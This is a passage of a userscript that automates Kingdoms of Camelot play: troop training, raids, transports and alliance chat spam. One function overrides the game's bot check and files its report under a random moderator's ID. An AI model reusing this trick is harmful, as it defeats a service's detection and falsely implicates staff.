qZ4iqiYiqq4iqzYiq74irAYi7I4i7RYi7Z4i7iIix1gA1kQASk2AwLQAHjQBSeQi8Z4jMiYjMq4jMzYjM74jKi4i13wASmWAwMgjGggAtC4jdzYjd74jeAYjrlIAjfgBRmgBJDgA9qCB2WgjeL4jvAYj%2FI4j%2FTIiiJQA1iQAVMACT8gLXZABu5YjwI5kARZkAZJixsQA1dQAQLnAwnwAHZQBiNwkBRZkRZ5kfOYkAspcDdQABAQkROJkSI5kiRZkre4ATRwBR8gcDXgkSBpkjAZkzI5k%2F%2F3yAUfsI80wAASgAfZOJM%2B%2BZNAWZAj0ANecJOvNgA72ZNBuZRM2ZTcOJRFuY868AAMwJMo4JRYmZVaeYscIAMqmWJTWZVkcJVbWZZmeZameAEKuZKQMJXCOJZoGZdyqZVqqZINuS14AJdzuZd86ZMXgAM2KXA7gJdlQJZ9eZiIiZEbsAM2mWKD%2BZaGmZiSOZkCuZhXgAGOuS3%2FGJmU2ZmeCY4b4JUVkJkNsJmfeZqouY0XIJoC9wN98Y8BmZqyOZu5CAIxEJjp%2BJpKSZu82ZuxaJt2mZsPgAdrEJu%2BeZzIaYq2iZs%2B0BfEaZzJGZ3IqZFs2ZzDWZzSmZ3JqZEY0JD%2Fzomd2hmevAmc3RkJ1mkHagCd4rmenUmeU2Ce8mEHu8me9EmZ7mme7FIHYxAC9dmfk8kBMeAF5amOfrGf%2Fnmgh9mVRRkF%2BFmg%2FImgECqXobmgkfAD%2BUkGDxqhGlqWCrqSFXqhGbqhIuqUAEqhBKqfITqiKgqUtimgDHqiBrqiMvqTLZoBL5qfMTqjOgqTCUmhNCAfepCjOzqkIjmhHvqjDxCkKUqkTHqQG1ADPgqkQtqkVEqQTxqlSTqlVbqlGQmlRxoueKClXDqm4nil1BgJPyqMYkqmbNqNZsoEaAqma9qmdOqMZsqgaaqkdbqn3Gik7%2BkD8lEHGMqnhGqnNaCS%2F3AKqH7RjoXaqMr4pJeZqIHKqI5aqbm4mpEKn4uqnpbaqa%2BIqQM6qZzqqaSqiqD6oqJaqqrqihdwqB6qqHVAqas6q6jYqpkKq7JKq7o6ipCKmXGapAC5q8IqipD6AXCKpHoQrMMqrMV6rECqrMuqq72KBL%2Bal6MarZ36pFXgq0iKB19wrdhaqdNard8arrRqmRjgrMJYrua6qugKpyOzruDaroTKATuAqJFQLYLqAfSqqnV5k%2Fk6ELHKr%2F1KqnWZrgHbAPtasAarkAirr2RAsAxrqdwJpxArsRPrqKGZqRebsZYKqhYrsBHrsZW6mlpgrAm7sCTbqKtZlCFbmuy6sv%2BEOgEKmQEvawcxK7N7SrOXSa3Vogc5q7N0agEOC5bycQfQKrRDW7Rt%2BazzqrRMSrQ927TASgJQW6dS66tTWbVXS6c8251Um6xP27U6%2BrUNKaVWS7ZkSp4phqxzqrZDSp4Cl6ZhuqRwy6Ry%2B6t6erdbmrdua7d8u6PciafSsreB26SDG6cQYLiHS6TcSa0zIKWA27gr%2Brjm6ZxqMLmUO6IJ2ZiXO5yZu7mOe5u%2Bap14ELqiK7gxoAUIa7qom7ozapusm6jscrqaC7sQ2qKtW7uvi7sq2qMoS6C267syCry0C7q3S7z9abyaKqjJq7z0Camj2ZYgCr2ce6ijGbB%2BMaj%2F1ruh4yoQftG73Yug38su6Pm846ud5QuR4pu%2B%2FWmrZwq%2BddC%2B7kuftqq11Vu%2FB2oBh4qZ1Mu%2B6Ku%2F0xkDWOC%2F4Hu%2BAuyfPWrA5ku%2FCay%2BAUqN%2F4vADxy9AcrAAFzBFlzAYLmODqzB26mQ0ysQEDC8ICyeGjnC67gGAXzCqZmQHBy23OvC2QnD3PqsLUzDn2nDbRsujKvDAxzDefq2QCybC9zDDfDDRdybwEutQ5zDSyyZTay3MxzFTHzBPQysUGzFh5nCEAarVczFsjkB9zi1YLzFYjyXE8AB%2FUutZ5zGvLmxpRuoYQzHp3mwbkzHaGzHaInHzVvHfNyZfvzGgYya%2F3Kcx9u7x4W8lZYbuUmKBsW4yJ%2FJtvkqpSUgyZNctNVKxJg8l8CZAZAruZ3cnjUbylmqyKPMlJ%2FsxOFiB5ycyme5ynFammCAyrDMogQMyrPsyrZ8yz5pm%2FnIysJYy76MmBqZAU0QCY6sxMUcl5%2BczMsMyM0cy7mczG47ttPclC36AdYspdiczUsJAl4KzU4Lzp4cwaycpd9szjQawd08zL3MziIpuyi7tc4rz2gpzldgs9p7z%2Fhslvp8pCIbz%2F9ckeIcmGiavwWtlQHtxAq90FhJyfJrBgQN0QWZuDSQnxRt0VkJAl5ZnjTQF3Ww0RztlPpcno7MyyVt0hHMoCn9yv8rTZK669LxCdMxPc%2BkS9MQadM3fZHLidI1XdE9HY%2FbbMrMPNQmOcXLzNNI7aTorMyi3NQzCcM2qrdMLdVWGsHOOpxXjdUCuc3kPJzE7NUwCdZQLdZCTdbdaNaRC89qbZJmTbdj%2FdYjuc3vKddpTdfPaNezXLd6XdcBqo%2Bfi6J%2FjdPm%2BKci3dWFHY4g4AKHPdiKvdjfuAErkI%2BI7aCSbZGUbdmf%2B495ndnISNn7fNevKc2gTY%2BiLdjN%2BZGmfdrymNqJWtqf7dq4uAEscKv%2B%2BMG0DY8aoMnn2dq7LY4akJKlm9izHdy0ONw9C9nHjdyyqAH9G9uJ7Nz1CN24Pd3UPY%2F%2Fyl3cmJ3d8tjby92cDSAHY6AB3i2PX%2BvGieLX5w2PNLut6p3Ekd3eufjecyzfzU3fqmjfeYzf%2Bi2O%2FA2f%2Fv3f4Njb8C3gR03gzjjc2xrbA67g3bjdDs7eEM6Nyo2yIY3dFb6Ntm2OxyrSwL3hx6gBLCCg8GrcIr6NJG7iaAri%2BZ3iALDiCJvh%2FgzjzagBMODhv1rjNr6MOK7jNB7iPV6LP87PND7fQ66KRe7EiY2xST7iKWnkKP7kyajcUr7TL57iF%2F7hrJ3lIq4BOoCvId3lVF7lYQ6wGa7SZQ7lKkna3b3muWjl76kDTQ7nxsjgGDDnIrvOdo6KFZuwsNnntU0D%2F6yLqhCZq4I%2Bi4m7tYGe6LXYqwyaA%2BYr5I7u5%2FeKsCMDkSNb6Yp%2B6ccqsk7O6ax6qPwMsXwu6gBgAV7pofK76aj%2BqQ4rcK0e6q9uqrFOvQrr6rXOinLMoLO%2B6664sVWNpCoL7KuolgiNpDh76qJOtDa51XcQtMZ%2BijyL4a0s7dNeiuldyVqc7aqYtT7LLneA5IkO7pEg6afs7alo7pK%2BuJQO7H%2Fe7smatupuitQZsu5O7%2FVOiouuLfO%2B7%2FYe69r77wDP7wIv6Q0w7vpe8ACQtyRM8Awfig5fuO%2B%2B6xPv7l6%2B4f2O8RFPrJpMwp7d8aFouSCv296et6ttByws8g2%2Flv%2Fqjbwsn7ium%2FEVLvOYS%2FMQ3rkDevMxf5uvqps4r%2BBG%2BqKyHfMyIKAvz%2BMMH5oczNws35ULmWKE3PHTmo7%2BiAZBT%2BBPGsxWX8Imn%2B1bD8q5%2BZFYH%2FP4qMvnWfYiP67WqfQFb7m%2FnfX%2F%2FbhdL59yr98JybpSLx88eff0fcRW%2F8h%2B396Ar6h6oPZUj8WBf%2FiDf94pvPeC3%2FNRv%2FiIH%2FE6n8WM3%2FNcANJ9kflrT7pSbycJru6Xn5sFMPreXviJgvpg%2F9TWmayN792de6YZ7vkdj8eQMOZ9L%2FkYAGFjHvIdv8arHvrbuwEiL%2FxmHNRP75W6TOzkLugc4AL7jMhqTvXSP8f%2BWB7z18%2Fk2f%2F5y92tz9%2FncF%2B4lb%2F0mvyji4sGl%2Bz92M%2F60265f8v7Rh3%2Bdg7%2Fchr72Q2ctN%2FKcx3x%2Bg8QTCL5eNDADpgQABQuZNjQ4UOIESVOpFjR4kWMGTVu5NjR40eQIUNuiHEFg0AaDx7gGZNQ5EuYMWXOpFnT5k2cEEmaRBJphko9LXMOJVrU6FGkSUXuPOnzAQQ9alwqpVrV6lWsWSmCiKHlg0CCD4JO1VrW7Fm0aTly9fI1UsqVZMiqpVvX7l2qIGi0FTijgFi5eAUPJlw4pN62Pf0CnmvY8WPIhdl%2B6AnXjtDImTVvPssVS4YpA1VebszZ9GnUNtmCFv3%2BgHRq2LFlg0ScAWXBOphn7%2Bbd2yGIHV5sv8Wt2%2Fdx5KmBf65cvHRy6NEly2BOvEHu59K1b08LgjqG5g%2BwcydfHq33z02Iizdu3v17pOhZ%2F2SfHf59%2FDHlh6Y%2FPv9%2FAGGSTz368EAoQAQTXCuGz%2FhTyUD7FJRwQgBWc3Cl9ijUcMLJLmQpwg1DvK9Dp8TKUEQU8SNJuAvHSvHF%2F0j6TIn1giIBRhzhm4xGuGzM8cfydizRRSCLlM7CEj80csnkJiPwwROZlFK5GNpSz7Iop9RyMxLDem1LME9DMiz%2FwjQzszH%2FKvNMNg1Ls74245SsStbIzFJOPM0CYYUGW1szT0D%2Fz9qAzzoTgDNQRM3SYIUrWLvB0D8TlZSqRRsNzQdI75x005yYAms0TTkVlSamesIUAjvQAHFUVl%2FSoCTwInkU1cBatdWmV0361LVQb%2FV1Iw1oaDS8L381NqRgG72N11WPdVaiYLUYzsten7XWoWinBbXZa7sFIFtTcTvQW3KhFTaDygq4btxy222IAliXLdZdeieId7156W3XXl1by1ffcoVtilpuAb412YG3NdjdZIfDsuCFWW2YCUkIjrjcbCl%2B%2BGJyX5UWJXUj5fhYj9H1KeQxQBi5Ww1g%2BPgtNatdmdOWX4ZL5JkPdtlhlXDOuVWPP7gyZoh%2FDjRat2gg2miS%2FmnwCuRDmfZ1YpijltpWhJeto9arbd2ghn5TorXortvcYIewn7KD67JH%2FdqkKNbbmuy2zXwbg7hvlrlus2moAu%2BKC5Jjb77PJOnvuAm6ju3CJT0cbz%2FVEKFxTrmCeyAIXCNjcson1QvuwHnlvPNEP4c8pesIJ31K0%2FN2bvXSBXadWdgRvXv2f2s3G%2BzTQd1Ad0DP7jcsPBgHnk3hYw1Lj82Px3MDGrhQ%2FsHmnY8z1%2Bmttt5M7MOrowsPtm%2Bz%2B6q%2FD1%2F8M8lXWnv0tWyZp6qLH739Ld9vav2o5qd%2FSg1Y0LViNanhfPtzHwu0cL%2B%2F4EEqBKyfAREoljXQjYET6t8B%2FqGWvwnyz4HLwmAGmUQSCxKHAfLz4AerdL8HjHAM%2BithjjyGQhWysIUw6t%2F%2FlNaAoMhwhimqIQZCc0Mi7dCFLmuKXxqgJCEOUTi3OaLqkvifV7Xlh0Bx4hPxE8UPTNFEErTie7CoRQh18UVR9OF6wihGFLXMC2WkQQNoh0YRRZE1bXwjHDf0RXxV0Y7kwaMOFLZHDckxNH7EEBcBKZ0X%2FtCNxTPkIaFjvx%2F%2BRQ%2BqciQFiRhJsVCykgoq2RQksT47LHCTCULS%2BuogylEGqJRqMl4qR9SVpPWsla58DwhjyT5aerEkPHsAHPSYS97k6pa%2BbCQwY2OBXS6LmMbEDzLT%2FsYAXw6Qme5xZqxSAs0x%2FG6a76lmeJa5TWrCypu%2FBCdq1KeSb5aTj%2BJcDxzYpc7tvLA5DXBnMeGJpr1YswENcEMXtHlP7dSmJzpwYz0Bup3JoKQBEIgDOQ8amRVl0ScLbeiNHhqdFc3HjRW9KEbpNEh1NdSeHSUMkgjaSzBIk6S9QVIOGPCAhqp0pbvJaGhcisuZxqamJfJZTlGzAf8NZwb77KlPTQNUZUkiB0R1qFHvUsGvKJWpI3WqWqCq0NRRtapoqZlbTlqHd27VnC6L6lfBJ9bYXFUSOghZFjSAVtj0MFwFgIMRKADX1MhTVgkogBuMgNe8wpJifinAGn4A%2F1hzClYShDUsYk8TNI09oABqOKxjOWO%2FKGBCaZOtrGU1g1lMDJWznt0MZhfbgNGSNjP2G%2BwABkBZ1a42Bn9DwmJdC9vYQuZVfzvCWhvAANzm1jHY6y1BgNtZ4RaGuIFrQHCTW1JYFbcgavDBc90UXeZS17pzOqB0m1vd7Q4mBF0BzyehpNXw3oRqFkvvU88VLoM0tb05oRpckDhfujQsPPfFb1r06y%2F59rcmyaKMaNaFXgHDJFcmA2WAEyyTc9bxwWaJAROyl7sJW4VfCZNwhrGy4XB12MNWIR97R4wV7MnLwSf%2BCPa0iGEWH8XFeURwjDWy4L4szcZVqZnJZjAA9v6obMeU2hnUijpk9cJAWXJbMZIxAlm5zdLJOIGyKaU8ZVw5LWk6xnJR%2FmvKJnd5IvVFWY3FDJGsle%2FKZ46JBnSwZKWNjc1DcTOc1bbmOYvkcxm4Us%2FCnOeG7NmTYDYzoBXiYgA2YHCFNrTlMKAeH6hLDng2tEcc3WfxVK%2FSM5mxlzS9af0IzJMmBrWARG2dI5f6xueKZFZVrZ8385nGr1Ywq2dNa5EgbIrxZTSg68xhRuJazzTAQvaCLWzaCCxctNIhsp98Lzv1Os8pto4cwursG%2B9SMWXGtkcWvG0Rd%2Fsi9lMM9aQ9Z9ZGggdADuW52VzBk0hi3eJBpbgzAm%2BK6f%2BA3fW297g3ONGV8LvfFcH3kCQ38Hv%2Fmz5RKQHCn71GJvLX4WOmU2QLAOOJN0QDLrCgeZvo7jMXHHUSzzia%2F31DkpccW0TMMQ7%2FvOmaFVFdQVQ5mqt0S5rXHFs312LOdc4QPNIgc3q49s8PfcIpourllQ76QjFec0G%2BxelLN3TQ1UZ1X%2FM8En5UOsjF3MenpNzondy6G5nn9S73WJGMMfpDYo5JBaIdy1w54KD%2F0u62%2F6Yrc7y7wNtOd4laWe5TrjIrB%2B9kYS5r0XnXeEluKVLGAz2Z64F85I%2B%2B5KHScwxvtfy32DnUXo5Bpm0nH%2Bhj2nnPw48%2Blbd8hFkf%2BQhHE%2FX%2Bem0jPVM6e%2FJWZp%2FuHL3REaPPB%2FTz8EgOwV4cVtAuDH%2FIiEkaRVeI%2Boj2xfkWtfxOTT8G6kd%2BRWzcaNF9%2F9Gyw9T7P1%2BNQmGK9TwjqT%2Fon7Mty%2B3qzu%2FENh5PdcaROn9C1n%2FiSC3wV9nPZv7TPfEYP52zpXxzI7BSvh3bACUrKwQkQKjzn%2F5DwCzovZ8jt7KjpyS4q87DQIIqLOSCvQYcLNRqLNy7gqiCgX0ywQ4cwdNKrRZEwSnAhA90LtiDlRkULRtkvBSzrdcaAtRLPcoIrdsCwhMsrx8DLiPsQHGyLSUMwuXKAQf4riB0tN7igekCr86zwuzSQsvjQsXRLtT%2FA0OVEMMtzD0DM8MvJKKB2ic1FEGesC1%2BCkEeVDIkBDI4oMO8AwE7rK0f6yU9%2FLsm%2FMM8DMLxOqDaWh83CMTvsyE3ekPG24kPyCw6gsS8sxfE0ay%2FsMS2u4DZwoAl%2BKRH9MLIE4EeaItQrERSZDxTbIvMqsEgCMLbwQQfQC01iEXU44DgmERatEVG%2FLkNkAG40SzJKkTUu4AaWKMoMK8BMMb4%2B7yCcMbqc7wlcAp6wsVnRMFQpA84wMbqkwGvWMafuEZZrIEDyqyfaEZv1D5zvAB0fAB1lEVYoUR43MG8E4EY4AJeTInX%2BkWdczTXGQC%2FksfLQZ2BHMN8xBtiFMi%2F%2F0JIfQxINWjIM3zIhbTHtsNHiuRHizQ6jNxHN%2FTHmsNIDDgCqXuAjfw5DkjIuCGkk9S5lJSeVyxDkFS5l1RIlpzJkqvJmDTJdWQ8naTBMuzJvHtJXjwpTuTIZNzHv3CDJfzCpJxBRWzKyAOBp%2FykpZRKxvMOKbLK4MNJ%2B%2BM5rlxEedxKRfTK%2FeM5TezKscyitBRL6EPLG3LLM4Q4WlQJufxCGeCLulRL1BOBpGQCWlxKs3Q4fEwMTZzDKrw5wIxLrNzDE1pMdWHKxFwjJDhMyXxL4UjEqwxCXRSDD1iCwETMXNwBzwTNSJtDzrM8ESDNzwzNuyxF1jyCwOTLzltNz%2F%2FsrbIMQlO8zbYcTIQzgR64TasUzc4zgSJggw%2FAzcj0zYEzzjf4ACJgrtdkvBVggufsgdCZzrxjFDr4ABwYTu00ugngTu%2B0yr5iTnsbzyugAxP4zs0Kz58bTyxgz%2B9UHPjUOXvxAjxoz7okzsizlzDYA%2F6sRRA8xhUQAwHFgUw4qfusOQuQgTIQ0BhY0BVET3GzANLczxjoTxb8T9IUUBnoxeay0G6zFwRtTwqFwcjzxBPFARr0ReiTgRMlgkwgrKP8x%2BBkzyjYBBV8ADQgUWy7ACJgAzEwATTgBKF7AMNKzT1EgSVggyX4ADz4BKGjwi80gTBYgxUoAUag0gIoADT%2F8AEmFU8Q0IEw%2BIEUAANK%2BIQfgAAIIIMf4EDfmAA6nYCFkFOlsFOQwFOLqFM0G1OGoAAK8NNA1QA%2BfQhBTVRFTdQJGFRH1QANaFRJHdQ6pVMLoABIrdRK1QALsFM6hVRQBdVP5VRStQBOtQBUTVUL2IANUFVVnYBVvQBX7dRU%2FR0LAIENAAEQmAANKNMu0IESAIMuDYU4WwMjQIEQCIENSNZk1VVdDQERiFYRSFZpZdZoBQForVYR8ABu9QBWZVVmZVUPCIFxZVZzzVVsNVdqldZrRddv3QB2lVYTmFcUMAER4AARGIFoJddu7dZ1jdYSiFd2RQGCZdcSKIETSNgT%2FwhYaT1YEyBYFDhYhEXYhD3YhIVYjI3YEkCBFOhYjyXYj%2BXYFMDYjgVZjz3ZkBXZEzDZjIXYlDVZFkBZj2UBmk0BmqVZkGWBnG1ZnkWBFViBjP1ZoR3ZkSXYFWCBo%2F3ZjhVapm1ap3Xam41apG3am12BGNiBGtiBHTjaGXCCJAABH2CEURgFYj2AwjICGmCBGVBbGqCBGYABuIWBGJjbuW1bu73ZGUhbFoABqbVbv50BwM1btw1cwSXcuIUBv01cxU3cGsharM3aHugBIpjcHtDayn1cv%2FUBzfWBHfgBzyUCz%2FVcrd2BySUCIzAC0C3d0j1dI%2FjcH1DdJYhd1k0C1P9VXda9XdpFXSOIXd693SXI3dPlXd6lXeEt3iW4Xd8V3t29XSdoXuSd3SQwXuXd3eMN3ue93uuN3SLY3uKNXtml3iUogvAN3u%2BV3uIVX%2FE93iIwgvU13fXdXvgVXid4Ai3ogi8Igy5Ygh8Agx9omT4IhU8YBVEQugDwq%2BbNAgRO4CyogirIAi3QAgZ%2B4C54YC1QYASm4ApG4Al%2BYAvuYA%2F%2BYAZWYAzuAhIm4REmYS%2FQAi8IAzEQgzB4YS%2BI4RKeYfv9Ahv%2BAjLIYR0mgxfu4TAggzIoAx8eYiJ%2B4RwO4iDeYSLO4R5mYiPeYR5u4ij%2B4SLugiLGXxrO4hKuXy3eYAxTzuAvpuAJXmAHDmEEroLmfYInaF42doIqUOM1ZmM4nmMGZmMGvuM7hmM3ZmA1xmM%2F5uM5juM1ll8n4F04jmArLoM1YIMyWGMYGIAf6NKxFQVRCAgAOw%3D%3D";

//var JSON;if(!JSON){JSON={};}(function(){"use strict";function f(n){return n<10?'0'+n:n;}if(typeof Date.prototype.toJSON!=='function'){Date.prototype.toJSON=function(key){return isFinite(this.valueOf())?this.getUTCFullYear()+'-'+f(this.getUTCMonth()+1)+'-'+f(this.getUTCDate())+'T'+f(this.getUTCHours())+':'+f(this.getUTCMinutes())+':'+f(this.getUTCSeconds())+'Z':null;};String.prototype.toJSON=Number.prototype.toJSON=Boolean.prototype.toJSON=function(key){return this.valueOf();};}var cx=/[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,escapable=/[\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,gap,indent,meta={'\b':'\\b','\t':'\\t','\n':'\\n','\f':'\\f','\r':'\\r','"':'\\"','\\':'\\\\'},rep;function quote(string){escapable.lastIndex=0;return escapable.test(string)?'"'+string.replace(escapable,function(a){var c=meta[a];return typeof c==='string'?c:'\\u'+('0000'+a.charCodeAt(0).toString(16)).slice(-4);})+'"':'"'+string+'"';}function str(key,holder){var i,k,v,length,mind=gap,partial,value=holder[key];if(value&&typeof value==='object'&&typeof value.toJSON==='function'){value=value.toJSON(key);}if(typeof rep==='function'){value=rep.call(holder,key,value);}switch(typeof value){case'string':return quote(value);case'number':return isFinite(value)?String(value):'null';case'boolean':case'null':return String(value);case'object':if(!value){return'null';}gap+=indent;partial=[];if(Object.prototype.toString.apply(value)==='[object Array]'){length=value.length;for(i=0;i<length;i+=1){partial[i]=str(i,value)||'null';}v=partial.length===0?'[]':gap?'[\n'+gap+partial.join(',\n'+gap)+'\n'+mind+']':'['+partial.join(',')+']';gap=mind;return v;}if(rep&&typeof rep==='object'){length=rep.length;for(i=0;i<length;i+=1){k=rep[i];if(typeof k==='string'){v=str(k,value);if(v){partial.push(quote(k)+(gap?': ':':')+v);}}}}else{for(k in value){if(Object.hasOwnProperty.call(value,k)){v=str(k,value);if(v){partial.push(quote(k)+(gap?': ':':')+v);}}}}v=partial.length===0?'{}':gap?'{\n'+gap+partial.join(',\n'+gap)+'\n'+mind+'}':'{'+partial.join(',')+'}';gap=mind;return v;}}if(typeof JSON.stringify!=='function'){JSON.stringify=function(value,replacer,space){var i;gap='';indent='';if(typeof space==='number'){for(i=0;i<space;i+=1){indent+=' ';}}else if(typeof space==='string'){indent=space;}rep=replacer;if(replacer&&typeof replacer!=='function'&&(typeof replacer!=='object'||typeof replacer.length!=='number')){throw new Error('JSON.stringify');}return str('',{'':value});};}if(typeof JSON.parse!=='function'){JSON.parse=function(text,reviver){var j;function walk(holder,key){var k,v,value=holder[key];if(value&&typeof value==='object'){for(k in value){if(Object.hasOwnProperty.call(value,k)){v=walk(value,k);if(v!==undefined){value[k]=v;}else{delete value[k];}}}}return reviver.call(holder,key,value);}text=String(text);cx.lastIndex=0;if(cx.test(text)){text=text.replace(cx,function(a){return'\\u'+('0000'+a.charCodeAt(0).toString(16)).slice(-4);});}if(/^[\],:{}\s]*$/.test(text.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,'@').replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,']').replace(/(?:^|:|,)(?:\s*\[)+/g,''))){j=eval('('+text+')');return typeof reviver==='function'?walk({'':j},''):j;}throw new SyntaxError('JSON.parse');};}}());
var JSON2 = JSON;

unsafeWindow.arthurCheck = function (a) {
  var b = false;
  for (var c = 0; c < a.length; c++) {
    if ($(unescape(a[c]))) {
      b = true;
      break
    }
  }
  if (b) {
    unsafeWindow.AjaxCall.gPostRequest("ajax/funnelTracking.php", {
      action: 1300,
      serverId: unsafeWindow.g_server,
      uid: unsafeWindow.moderators[Math.floor((Math.random()*unsafeWindow.moderators.length))]
    })
  }
};
var upgradeData = {
  active : false,
  item_upgrade : {},
  item_enhance : {},
  item_repair : [],
  retryInterval : 30,
  enhanceAction : "show",
  enhanceItem : 0,
  enhanceMax  : 1,
  minStones : 100000,
  queuetype : 0,
  upgradetype : 0,
};


var Options = {
  srcSortBy    : 'level',
  srcMinLevel  : 1,
  srcMaxLevel  : 7,
  wildType     : 1,
  unownedOnly  : true,
  mistedOnly   : true,
  hostileOnly  : false,  
  friendlyOnly : false,  
  alliedOnly   : false,  
  unalliedOnly : false,  
  neutralOnly  : false,  
  srcAll       : true,  
  srcScoutAmt  : 1,
  minmight     : 1,
  srcdisttype  : 'square',
  pbWinIsOpen  : false,
  pbWinDrag    : true,
  pbWinPos     : {},
  pbTrackOpen  : true,
  pbKillFairie : false,
  pbGoldHappy  : 95,
  pbGoldEnable : false,
  pbEveryEnable: false,
  pbEveryMins  : 30,
  pbChatOnRight: false,
  pbWideMap    : false,
  pbFoodAlert  : false,
  alertConfig  : {aChat:false, aPrefix:'** I\'m being attacked! **', scouting:false, wilds:false, defend:true, minTroops:10000, spamLimit:10, lastAttack:0, barbautoswitch:false, raidautoswitch: {}, alertTR:false, alertTRset:1, alertTR2:false, alertTRset2:1, alertTRsetwaittime:60,RecentActivity:false},
  alertSound   : {enabled:false, soundUrl:DEFAULT_ALERT_SOUND_URL, repeat:true, playLength:20, repeatDelay:0.5, volume:100, alarmActive:false, expireTime:0},
  spamconfig   : {aspam:false, spamvert:'Join my Alliance!!', spammins:'30', atime:2 , spamstate:'a'},
  giftDomains  : {valid:false, list:{}},
  celltext     : {atext:false, provider:0, num1:"000", num2:"000", num3:"0000"},
  giftDelete   : 'e',
  currentTab   : null,
  hideOnGoto   : true,
  transportinterval : 60,
  minwagons    : 100,
  lasttransport: 0,
  reassigninterval: 60,
  lastreassign : 0,
  HelpRequest  : false,
  DeleteRequest: false,
  DeletegAl    : false,
  MapShowExtra : false,
  RaidRunning  : false,
  RaidReset    : 0,
  DeleteMsg	   : false,
  DeleteMsgs0  : false,
  DeleteMsgs1  : false,
  DeleteMsgs2  : false,
  DeleteMsgs3  : false,
  Foodstatus   : {1:0,2:0,3:0,4:0,5:0,6:0,7:0},
  Creststatus  : {1101:0,1102:0,1103:0,1104:0,1105:0,1106:0,1107:0,1108:0,1109:0,1110:0,1111:0,1112:0,1113:0,1114:0,1115:0},
  LastReport   : 0,
  LastCrestReport   : 0,
  MsgInterval  : 1,
  CrestMsgInterval  : 1,
  foodreport   : false,
  crestreport  : true,
  Crest1Count  : 0,                            
  Crest2Count  : 0,                                                                            
  crestRunning   : false,    
  Crestinterval        : 5,        
  ThroneDeleteItems    :    false,
  ThroneDeleteLevel    :    0,
  throneSaveNum    :    10,
  throneDeletedNum : 0,
  RangeSaveModeSetting : 0,
  Opacity : 0.9,
  language : 'en',
  curMarchTab : "transport",
  BreakingNews : 0,
  ScripterTab : false,
  KMagicBox : false,
  filter : false,
  mklag	:	false,
  amain	:	false,
  smain	:	0,
};
//unsafeWindow.pt_Options=Options;

var GlobalOptions = {
  pbWatchdog   : false,
  pbWideScreen : true,
  pbWideScreenStyle : 'normal',
  autoPublishGamePopups : false,
  autoCancelGamePopups : false,
  autoPublishPrivacySetting : 80,
  pbupdate : true,
  pbupdatebeta : 0,
  pbNoMoreKabam : false,
  escapeurl : null,
};

var CrestOptions = {
  Running   	: 	false,
  curRound		:	1,
  CrestCity 	: 	0,
  RoundOne  	: 	false,
  RoundTwo  	: 	true,
  lastRoundOne 	: 	0,
  lastRoundTwo 	: 	0,
  X				:	0,
  Y				:	0,
  R1ST			:	0,
  R1MM			:	0,
  R1Scout		:	0,
  R1Pike		:	0,
  R1Sword		:	0,
  R1Arch		:	0,
  R1LC			:	0,
  R1HC			:	0,
  R1SW			:	0,
  R1Ball		:	0,
  R1Ram			:	0,
  R1Cat			:	0,
  R2ST			:	0,
  R2MM			:	0,
  R2Scout		:	0,
  R2Pike		:	0,
  R2Sword		:	0,
  R2Arch		:	0,
  R2LC			:	0,
  R2HC			:	0,
  R2SW			:	0,
  R2Ball		:	0,
  R2Ram			:	0,
  R2Cat			:	0,
  isWild		:	true,
};


var CrestData = new Array();

	function CrestFunc (Arr) {
	
		if (Arr == undefined)
			Arr = CrestOptions;

		this.Running 		=  	true;
		this.curRound		=	1,
  		this.CrestCity 		= 	Arr.CrestCity;
		this.RoundOne 		= 	Arr.RoundOne;
		this.RoundTwo 		= 	true;
		this.lastRoundOne 	= 	0;
		this.lastRoundTwo 	= 	0;
		this.X 				= 	Arr.X;
		this.Y 				= 	Arr.Y;
		this.R1ST 			= 	Arr.R1ST;
		this.R1MM 			= 	Arr.R1MM;
		this.R1Scout 		= 	Arr.R1Scout;
		this.R1Pike 		= 	Arr.R1Pike;
		this.R1Sword 		= 	Arr.R1Sword;
		this.R1Arch 		= 	Arr.R1Arch;
		this.R1LC 			= 	Arr.R1LC;
		this.R1HC 			= 	Arr.R1HC;
		this.R1SW 			= 	Arr.R1SW;
		this.R1Ball 		= 	Arr.R1Ball;
		this.R1Ram 			= 	Arr.R1Ram;
		this.R1Cat 			= 	Arr.R1Cat;
		this.R2ST 			= 	Arr.R2ST;
		this.R2MM 			= 	Arr.R2MM;
		this.R2Scout 		= 	Arr.R2Scout;
		this.R2Pike 		= 	Arr.R2Pike;
		this.R2Sword 		= 	Arr.R2Sword;
		this.R2Arch 		= 	Arr.R2Arch;
		this.R2LC 			= 	Arr.R2LC;
		this.R2HC 			= 	Arr.R2HC;
		this.R2SW 			= 	Arr.R2SW;
		this.R2Ball 		= 	Arr.R2Ball;
		this.R2Ram 			= 	Arr.R2Ram;
		this.R2Cat 			= 	Arr.R2Cat;
		this.isWild			=	Arr.isWild;
		
	};

var TrainOptions = {
  Running    : false,
  Troops     : {1:0,2:0,3:0,4:0,5:0,6:0,7:0,8:0},
  Threshold  : {1:500,2:500,3:500,4:500,5:500,6:500,7:500,8:500},
  Max        : {1:0,2:0,3:0,4:0,5:0,6:0,7:0,8:0},
  Gamble     : {1:0,2:0,3:0,4:0,5:0,6:0,7:0,8:0},
  Workers    : {1:0,2:0,3:0,4:0,5:0,6:0,7:0,8:0},
  Item       : {1:0,2:0,3:0,4:0,5:0,6:0,7:0,8:0},
  Keep       : {1:{Food:0,Wood:0,Stone:0,Ore:0},
                2:{Food:0,Wood:0,Stone:0,Ore:0},
				3:{Food:0,Wood:0,Stone:0,Ore:0},
				4:{Food:0,Wood:0,Stone:0,Ore:0},
				5:{Food:0,Wood:0,Stone:0,Ore:0},
				6:{Food:0,Wood:0,Stone:0,Ore:0},
				7:{Food:0,Wood:0,Stone:0,Ore:0},
				8:{Food:0,Wood:0,Stone:0,Ore:0}
			   },
  Enabled    : {1:false,2:false,3:false,4:false,5:false,6:false,7:false,8:false},
  SelectMax  : {1:false,2:false,3:false,4:false,5:false,6:false,7:false,8:false},
  Resource   : {1:true,2:true,3:true,4:true,5:true,6:true,7:true,8:true},
  UseIdlePop : {1:true,2:true,3:true,4:true,5:true,6:true,7:true,8:true},
  CraftingRunning : false,
  CraftIntervallMin : 3,
